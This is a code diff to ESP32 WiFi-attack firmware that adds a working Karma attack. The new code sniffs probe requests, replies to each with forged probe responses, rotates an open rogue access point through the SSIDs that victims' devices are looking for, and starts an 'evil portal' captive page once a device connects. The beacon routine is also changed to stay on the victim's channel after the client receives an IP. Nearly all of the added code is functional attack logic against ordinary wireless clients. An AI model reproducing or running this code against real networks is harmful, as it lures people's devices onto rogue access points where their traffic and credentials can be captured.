@@ -68,6 +68,8 @@
 // limit how many ap records we keep to avoid memory bloat/crashes
 #define MAX_SCANNED_APS 100
 
+#define KARMA_MAX_SSIDS 32
+
 static char g_beacon_list[BEACON_LIST_MAX][BEACON_SSID_MAX_LEN+1];
 static int g_beacon_list_count = 0;
 
@@ -109,6 +111,11 @@ static bool boot_connection_attempted = false;
 void *beacon_task_handle = NULL;
 void *deauth_task_handle = NULL;
 int beacon_task_running = 0;
+
+static bool karma_portal_active = false;
+
+static volatile bool ap_sta_has_ip = false;
+
 
 const uint16_t COMMON_PORTS[] = {
     7,     // echo
@@ -428,7 +435,10 @@ static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_
             if (ap_connection_count > 0) ap_connection_count--;
             printf("WiFi_manager: Station disconnected from AP\n");
             login_done = false;
-            if (ap_connection_count == 0) esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
+            if (ap_connection_count == 0) {
+                esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
+                ap_sta_has_ip = false;
+            }
             break;
         case WIFI_EVENT_STA_START:
             printf("STA started\n");
@@ -452,6 +462,7 @@ static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_
             break;
         case IP_EVENT_AP_STAIPASSIGNED:
             printf("Assigned IP to STA\n");
+            ap_sta_has_ip = true;
             break;
         default:
             break;
@@ -4114,9 +4125,21 @@ esp_err_t wifi_manager_broadcast_ap(const char *ssid) {
         0x64, 0x00,                                     // Beacon interval (100 TU)
         0x11, 0x04,                                     // Capability info (ESS)
     };
+    // if a station on the AP has an IP, don't hop channels; send on current channel only
+    int start_channel = 1;
+    int end_channel = 11;
+    if (ap_sta_has_ip) {
+        uint8_t primary_channel;
+        wifi_second_chan_t second_channel;
+        esp_wifi_get_channel(&primary_channel, &second_channel);
+        start_channel = primary_channel;
+        end_channel = primary_channel;
+    }
 
-    for (int ch = 1; ch <= 11; ch++) {
-        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    for (int ch = start_channel; ch <= end_channel; ch++) {
+        if (!ap_sta_has_ip) {
+            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+        }
         generate_random_mac(&packet[10]);
         memcpy(&packet[16], &packet[10], 6);
 
@@ -4179,7 +4202,8 @@ esp_err_t wifi_manager_broadcast_ap(const char *ssid) {
             return err;
         }
 
-        vTaskDelay(pdMS_TO_TICKS(10)); // Delay between channel hops
+        vTaskDelay(pdMS_TO_TICKS(10));
+        if (ap_sta_has_ip) break; // only one transmit when a client has IP
     }
 
     return ESP_OK;
@@ -6059,4 +6083,247 @@ static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
 /**
  * Inject SAE confirm frame after successful commit exchange
  */
-// confirm injection removed – flood commits only
+static bool karma_running = false;
+static TaskHandle_t karma_task_handle = NULL;
+
+// Add these globals near your other Karma variables
+static char karma_ssid_cache[KARMA_MAX_SSIDS][33];
+static int karma_ssid_count = 0;
+static int karma_ssid_index = 0;
+static uint32_t last_ssid_change_time = 0;
+static bool karma_ssid_manual_mode = false;
+
+
+// Helper to add SSID to cache if not present
+static void karma_add_ssid(const char *ssid) {
+    if (ssid == NULL || strlen(ssid) == 0) return;
+    // Check for duplicate
+    for (int i = 0; i < karma_ssid_count; ++i) {
+        if (strcmp(karma_ssid_cache[i], ssid) == 0) return;
+    }
+    // Add if space
+    if (karma_ssid_count < KARMA_MAX_SSIDS) {
+        strncpy(karma_ssid_cache[karma_ssid_count], ssid, 32);
+        karma_ssid_cache[karma_ssid_count][32] = '\0';
+        karma_ssid_count++;
+        printf("Karma cached SSID: %s\n", ssid);
+        TERMINAL_VIEW_ADD_TEXT("Karma cached SSID: %s\n", ssid);
+    }
+}
+
+void wifi_manager_set_karma_ssid_list(const char **ssids, int count) {
+    if (count > KARMA_MAX_SSIDS) count = KARMA_MAX_SSIDS;
+    karma_ssid_count = 0;
+    for (int i = 0; i < count; ++i) {
+        if (ssids[i] && strlen(ssids[i]) > 0 && strlen(ssids[i]) < 33) {
+            strncpy(karma_ssid_cache[karma_ssid_count], ssids[i], 32);
+            karma_ssid_cache[karma_ssid_count][32] = '\0';
+            karma_ssid_count++;
+        }
+    }
+    karma_ssid_index = 0;
+    karma_ssid_manual_mode = true;
+}
+
+// Helper function to send a probe response to a station
+static void karma_send_probe_response(const uint8_t *sta_mac, const char *ssid) {
+    uint8_t resp[128] = {0};
+    int idx = 0;
+    // Frame Control: Probe Response (0x50 0x00)
+    resp[idx++] = 0x50; resp[idx++] = 0x00;
+    // Duration
+    resp[idx++] = 0x00; resp[idx++] = 0x00;
+    // Destination: station MAC
+    memcpy(&resp[idx], sta_mac, 6); idx += 6;
+    // Source: our AP MAC
+    uint8_t ap_mac[6];
+    esp_wifi_get_mac(WIFI_IF_AP, ap_mac);
+    memcpy(&resp[idx], ap_mac, 6); idx += 6;
+    // BSSID: our AP MAC
+    memcpy(&resp[idx], ap_mac, 6); idx += 6;
+    // Seq-ctl
+    resp[idx++] = 0x00; resp[idx++] = 0x00;
+    // Timestamp (8 bytes)
+    memset(&resp[idx], 0, 8); idx += 8;
+    // Beacon interval
+    resp[idx++] = 0x64; resp[idx++] = 0x00;
+    // Capability info
+    resp[idx++] = 0x11; resp[idx++] = 0x04;
+    // SSID IE
+    resp[idx++] = 0x00; // Tag
+    resp[idx++] = strlen(ssid); // Length
+    memcpy(&resp[idx], ssid, strlen(ssid)); idx += strlen(ssid);
+    // Supported rates IE
+    resp[idx++] = 0x01; resp[idx++] = 0x08;
+    resp[idx++] = 0x82; resp[idx++] = 0x84; resp[idx++] = 0x8B; resp[idx++] = 0x96;
+    resp[idx++] = 0x24; resp[idx++] = 0x30; resp[idx++] = 0x48; resp[idx++] = 0x6C;
+    // DS Parameter Set IE (channel)
+    resp[idx++] = 0x03; resp[idx++] = 0x01;
+    uint8_t channel = 1;
+    wifi_second_chan_t second;
+    esp_wifi_get_channel(&channel, &second);
+    resp[idx++] = channel;
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, resp, idx, false);
+
+    // --- VERBOSE LOGGING FOR KARMA INTERACTIONS ---
+    if (err == ESP_OK) {
+        printf("[KARMA] Sent probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
+            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid);
+        TERMINAL_VIEW_ADD_TEXT("[KARMA] Sent probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
+            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid);
+    } else {
+        printf("[KARMA] Failed to send probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s': %s\n",
+            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid, esp_err_to_name(err));
+        TERMINAL_VIEW_ADD_TEXT("[KARMA] Failed to send probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s': %s\n",
+            sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid, esp_err_to_name(err));
+    }
+}
+
+static void karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT) return;
+    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
+    const wifi_ieee80211_hdr_t *hdr = &ipkt->hdr;
+    uint8_t subtype = (hdr->frame_ctrl & 0xF0) >> 4;
+    if (subtype != 4) return;
+    const uint8_t *payload = ipkt->payload;
+    int ssid_offset = 0;
+    while (ssid_offset < pkt->rx_ctrl.sig_len - 24) {
+        if (payload[ssid_offset] == 0x00) { // SSID IE
+            uint8_t ssid_len = payload[ssid_offset + 1];
+            if (ssid_len > 0 && ssid_len < 33) {
+                char probed_ssid[33] = {0};
+                memcpy(probed_ssid, &payload[ssid_offset + 2], ssid_len);
+                if (!karma_ssid_manual_mode) {
+                    karma_add_ssid(probed_ssid);
+                }
+                printf("[KARMA] Received probe request from STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
+                    hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5], probed_ssid);
+                TERMINAL_VIEW_ADD_TEXT("[KARMA] Received probe request from STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
+                    hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5], probed_ssid);
+                // Respond directly to probe request
+                karma_send_probe_response(hdr->addr2, probed_ssid);
+            }
+            break;
+        }
+        ssid_offset += payload[ssid_offset + 1] + 2;
+    }
+}
+
+static void karma_start_portal_for_ssid(const char *ssid) {
+    // Use the default portal, SSID as AP name, open AP (no password)
+    if (!karma_portal_active) {
+        wifi_manager_start_evil_portal("default", ssid, "", ssid, "portal.local");
+        karma_portal_active = true;
+        printf("[KARMA] Evil portal started for SSID: %s\n", ssid);
+        TERMINAL_VIEW_ADD_TEXT("[KARMA] Evil portal started for SSID: %s\n", ssid);
+    }
+}
+
+static void karma_stop_portal_if_active(void) {
+    if (karma_portal_active) {
+        wifi_manager_stop_evil_portal();
+        karma_portal_active = false;
+        printf("[KARMA] Evil portal stopped\n");
+        TERMINAL_VIEW_ADD_TEXT("[KARMA] Evil portal stopped\n");
+    }
+}
+
+static void karma_task(void *param) {
+    printf("Karma attack started\n");
+    TERMINAL_VIEW_ADD_TEXT("Karma attack started\n");
+    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(karma_probe_request_callback);
+
+    last_ssid_change_time = esp_timer_get_time() / 1000;
+
+    // If only one SSID, set it once and don't rotate
+    if (karma_ssid_count == 1) {
+        wifi_config_t ap_config = {
+            .ap = {
+                .ssid = "",
+                .ssid_len = strlen(karma_ssid_cache[0]),
+                .channel = 1,
+                .authmode = WIFI_AUTH_OPEN,
+                .max_connection = 4,
+                .ssid_hidden = 0
+            }
+        };
+        strncpy((char *)ap_config.ap.ssid, karma_ssid_cache[0], 32);
+        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+        ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
+        ESP_ERROR_CHECK(esp_wifi_start());
+        printf("Karma using single SSID: %s\n", karma_ssid_cache[0]);
+        TERMINAL_VIEW_ADD_TEXT("Karma using single SSID: %s\n", karma_ssid_cache[0]);
+        karma_start_portal_for_ssid(karma_ssid_cache[0]);
+    }
+
+    while (karma_running) {
+        uint32_t now = esp_timer_get_time() / 1000;
+        // Only rotate if more than one SSID
+        if (!ap_sta_has_ip && karma_ssid_count > 1 && (now - last_ssid_change_time > 5000)) {
+            wifi_config_t ap_config = {
+                .ap = {
+                    .ssid = "",
+                    .ssid_len = strlen(karma_ssid_cache[karma_ssid_index]),
+                    .channel = 1,
+                    .authmode = WIFI_AUTH_OPEN,
+                    .max_connection = 4,
+                    .ssid_hidden = 0
+                }
+            };
+            strncpy((char *)ap_config.ap.ssid, karma_ssid_cache[karma_ssid_index], 32);
+            ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
+            printf("Karma rotating to SSID: %s\n", karma_ssid_cache[karma_ssid_index]);
+            TERMINAL_VIEW_ADD_TEXT("Karma rotating to SSID: %s\n", karma_ssid_cache[karma_ssid_index]);
+            karma_start_portal_for_ssid(karma_ssid_cache[karma_ssid_index]);
+            karma_ssid_index = (karma_ssid_index + 1) % karma_ssid_count;
+            last_ssid_change_time = now;
+        }
+    
+        // Send beacon frames for all cached SSIDs (every 500ms)
+        if (!ap_sta_has_ip) {
+            for (int i = 0; i < karma_ssid_count; ++i) {
+                wifi_manager_broadcast_ap(karma_ssid_cache[i]);
+                vTaskDelay(pdMS_TO_TICKS(10)); // Small delay between beacons
+            }
+        }
+    
+        vTaskDelay(pdMS_TO_TICKS(500));
+    }
+    esp_wifi_set_promiscuous(false);
+    karma_stop_portal_if_active();
+    karma_task_handle = NULL;
+    printf("Karma attack stopped\n");
+    TERMINAL_VIEW_ADD_TEXT("Karma attack stopped\n");
+    vTaskDelete(NULL);
+}
+void wifi_manager_start_karma(void) {
+    if (karma_running) {
+        printf("Karma attack already running\n");
+        TERMINAL_VIEW_ADD_TEXT("Karma attack already running\n");
+        return;
+    }
+    karma_running = true;
+    if (!karma_ssid_manual_mode) {
+        karma_ssid_count = 0;
+        karma_ssid_index = 0;
+    }
+    xTaskCreate(karma_task, "karma_task", 4096, NULL, 5, &karma_task_handle);
+}
+
+void wifi_manager_stop_karma(void) {
+    if (!karma_running) {
+        printf("Karma attack not running\n");
+        TERMINAL_VIEW_ADD_TEXT("Karma attack not running\n");
+        return;
+    }
+    karma_running = false;
+    karma_ssid_count = 0;
+    karma_ssid_index = 0;
+    karma_ssid_manual_mode = false;
+    // Task will clean up itself
+}
